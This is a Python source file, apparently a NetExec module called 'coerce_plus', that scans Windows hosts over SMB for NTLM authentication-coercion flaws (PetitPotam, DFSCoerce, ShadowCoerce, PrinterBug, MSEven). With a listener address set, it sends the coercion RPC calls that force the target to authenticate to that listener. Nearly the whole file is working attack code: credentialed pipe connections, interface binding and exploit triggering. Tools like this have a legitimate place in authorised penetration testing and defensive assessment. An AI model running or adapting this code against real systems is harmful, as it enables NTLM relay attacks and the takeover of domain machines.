import nxc

from os.path import dirname
from os.path import join as path_join

from nxc.paths import NXC_PATH
from nxc.loaders.moduleloader import ModuleLoader

from impacket.uuid import uuidtup_to_bin, bin_to_string
from impacket.dcerpc.v5 import transport, rprn, even, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


class NXCModule:
    name = "coerce_plus"
    description = "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None
        self.always_continue = None
        self.method = "all"

        self.method_paths = [
            path_join(dirname(nxc.__file__), "modules", "coerce_plus_method"),
            path_join(NXC_PATH, "modules", "coerce_plus_method"),
        ]
        self.method_modules = ModuleLoader.load_all_modules_from_subdirs(self.method_paths)

    def options(self, context, module_options):
        """
        LISTENER       LISTENER for exploitation (default: 127.0.0.1)
        ALWAYS         Always continue to all exploit (default: False)
        METHOD         Exploit method (Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven, All   default: All)
        M              Alias for METHOD
        L              Alias for LISTENER
        """
        self.listener = None
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        if "L" in module_options:
            self.listener = module_options["L"]
        if "ALWAYS" in module_options:
            self.always_continue = True
        if "METHOD" in module_options:
            self.method = module_options["METHOD"].lower()
        if "M" in module_options:
            self.method = module_options["M"].lower()

    def on_login(self, context, connection):
        runmethod = False
        if self.method == "all" or self.method[:1] == "d":  # DFSCoerce
            runmethod = True
            """DFSCOERCE START"""
            try:
                dfscocerceclass = DFSCoerceTrigger(context, self.method_modules)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                dfscocerceconnect = dfscocerceclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="netdfs"
                )

                if dfscocerceconnect is not None:
                    context.log.debug("Target is vulnerable to DFSCoerce")
                    context.log.highlight("VULNERABLE, DFSCoerce")
                    if self.listener is not None:  # exploit
                        dfscocerceclass.exploit(dfscocerceconnect, self.listener, self.always_continue, "netdfs")
                    dfscocerceconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to DFSCoerce")
            except Exception as e:
                context.log.error(f"Error in DFSCoerce module: {e}")
            """ DFSCOERCE END """

        if self.method == "all" or self.method[:1] == "s":  # ShadowCoerce
            runmethod = True
            """ ShadowCoerce START """
            try:
                shadowcocerceclass = ShadowCoerceTrigger(context, self.method_modules)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                shadowcocerceconnect = shadowcocerceclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="Fssagentrpc"
                )

                if shadowcocerceconnect is not None:
                    context.log.debug("Target is vulnerable to ShadowCoerce")
                    context.log.highlight("VULNERABLE, ShadowCoerce")
                    if self.listener is not None:  # exploit
                        shadowcocerceclass.exploit(shadowcocerceconnect, self.listener, self.always_continue, "Fssagentrpc")
                    shadowcocerceconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to ShadowCoerce")
            except Exception as e:
                context.log.error(f"Error in ShadowCoerce module: {e}")
            """ ShadowCoerce END """

        if self.method == "all" or self.method[:2] == "pe":  # PetitPotam
            runmethod = True
            """ PETITPOTAM START """
            pipes = ["efsrpc", "lsarpc", "samr", "lsass", "netlogon"]
            reducelog = True
            for pipe in pipes:
                context.log.debug(f"Trying to connect to {pipe} pipe")
                try:
                    petitpotamclass = PetitPotamtTrigger(context, self.method_modules)
                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                    petitpotamconnect = petitpotamclass.connect(
                        username=connection.username,
                        password=connection.password,
                        domain=connection.domain,
                        lmhash=connection.lmhash,
                        nthash=connection.nthash,
                        target=target,
                        doKerberos=connection.kerberos,
                        dcHost=connection.kdcHost,
                        aesKey=connection.aesKey,
                        pipe=pipe
                    )

                    if petitpotamconnect is not None:
                        if reducelog:
                            context.log.debug("Target is vulnerable to PetitPotam")
                            context.log.highlight("VULNERABLE, PetitPotam")
                            reducelog = False
                        if self.listener is not None:  # exploit TODO
                            exploit_status = petitpotamclass.exploit(petitpotamconnect, self.listener, self.always_continue, pipe)
                            if not self.always_continue and exploit_status:
                                break
                        petitpotamconnect.disconnect()
                    else:
                        context.log.debug("Target is not vulnerable to PetitPotam")
                except Exception as e:
                    context.log.error(f"Error in PetitPotam module: {e}")
            """ PETITPOTAM END """

        if self.method == "all" or self.method[:2] == "pr":  # PrinterBug
            runmethod = True
            """ PRINTERBUG START """
            pipes = ["spoolss", "[dcerpc]"]
            for pipe in pipes:
                try:
                    printerbugclass = PrinterBugTrigger(context, self.method_modules)
                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                    printerbugconnect = printerbugclass.connect(
                        username=connection.username,
                        password=connection.password,
                        domain=connection.domain,
                        lmhash=connection.lmhash,
                        nthash=connection.nthash,
                        target=target,
                        doKerberos=connection.kerberos,
                        dcHost=connection.kdcHost,
                        aesKey=connection.aesKey,
                        pipe=pipe
                    )

                    if printerbugconnect is not None:
                        context.log.debug("Target is vulnerable to PrinterBug")
                        context.log.highlight("VULNERABLE, PrinterBug")
                        if self.listener is not None:  # exploit
                            exploit_status = printerbugclass.exploit(printerbugconnect, self.listener, target, self.always_continue, pipe)
                            if not self.always_continue and exploit_status:
                                break
                        printerbugconnect.disconnect()
                    else:
                        context.log.debug("Target is not vulnerable to PrinterBug")
                except Exception as e:
                    context.log.error(f"Error in PrinterBug module: {e}")
            """ PRINTERBUG END """

        if self.method == "all" or self.method[:1] == "m":  # MSEven
            runmethod = True
            """ MSEVEN START """
            try:
                msevenclass = MSEvenTrigger(context, self.method_modules)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                msevenconnect = msevenclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="eventlog"
                )

                if msevenconnect is not None:
                    context.log.debug("Target is vulnerable to MSEven")
                    context.log.highlight("VULNERABLE, MSEven")
                    if self.listener is not None:  # exploit
                        msevenclass.exploit(msevenconnect, self.listener, self.always_continue, "eventlog")
                    msevenconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to MSEven")
            except Exception as e:
                context.log.error(f"Error in MSEven module: {e}")
            """ MSEVEN END """
        if not runmethod:
            context.log.error("Invalid method, please check the method name.")
            return

class ShadowCoerceTrigger:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "Fssagentrpc": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\Fssagentrpc]",
                "MSRPC_UUID_FSRVP": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_FSRVP"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == "MS_FSRVP":
                self.context.log.debug(f"Sending {CoerceMethod}!")
                try:
                    method.request(dce, listener)
                except Exception as e:
                    self.handle_exception(CoerceMethod, pipe, always_continue, e)

    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{CoerceMethod} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")

class DFSCoerceTrigger:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "netdfs": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\netdfs]",
                "MSRPC_UUID_DFSNM": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_DFSNM"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == "MS_DFSNM":
                self.context.log.debug(f"Sending {CoerceMethod}!")
                try:
                    method.request(dce, listener)
                except Exception as e:
                    self.handle_exception(CoerceMethod, pipe, always_continue, e)

    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{CoerceMethod} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")

class PetitPotamtTrigger:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "lsarpc": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsarpc]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "efsrpc": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\efsrpc]",
                "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
            },
            "samr": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\samr]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "lsass": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsass]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "netlogon": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\netlogon]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
        }

        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EFSR"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == "MS_EFSR":
                self.context.log.debug(f"Sending {CoerceMethod}!")
                try:
                    method.request(dce, listener)
                except Exception as e:
                    self.handle_exception(CoerceMethod, pipe, always_continue, e)

    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{CoerceMethod} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")


class PrinterBugTrigger:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods

    def get_dynamic_endpoint(self, interface: bytes, target: str, timeout: int = 5) -> str:
        string_binding = rf"ncacn_ip_tcp:{target}[135]"
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_connect_timeout(timeout)
        dce = rpctransport.get_dce_rpc()
        self.context.log.debug(f"Trying to resolve dynamic endpoint {bin_to_string(interface)!r}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.warning(f"Failed to connect to endpoint mapper: {e}")
            raise e
        try:
            endpoint = epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
            self.context.log.debug(
                f"Resolved dynamic endpoint {bin_to_string(interface)!r} to {endpoint!r}"
            )
            return endpoint
        except Exception as e:
            self.context.log.debug(f"Failed to resolve dynamic endpoint {bin_to_string(interface)!r}")
            raise e

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "spoolss": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\spoolss]",
                "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                "port": 445
            },
            "[dcerpc]": {
                "stringBinding": self.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
                "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                "port": None
            }
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        if binding_params[pipe]["port"] is not None:
            rpctransport.set_dport(binding_params[pipe]["port"])

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_RPRN"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("Successfully bound!")
        return dce

    def exploit(self, dce, listener, target, always_continue, pipe):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == "MS_RPRN":
                self.context.log.debug(f"Sending {CoerceMethod}!")
                try:
                    method.request(dce, listener, target)
                except Exception as e:
                    self.handle_exception(CoerceMethod, pipe, always_continue, e)

    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{CoerceMethod} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")

class MSEvenTrigger:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "eventlog": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\eventlog]",
                "MSRPC_UUID_EVEN": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EVEN"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == "MS_EVEN":
                self.context.log.debug(f"Sending {CoerceMethod}!")
                try:
                    method.request(dce, listener)
                except Exception as e:
                    self.handle_exception(CoerceMethod, pipe, always_continue, e)

    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{CoerceMethod} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")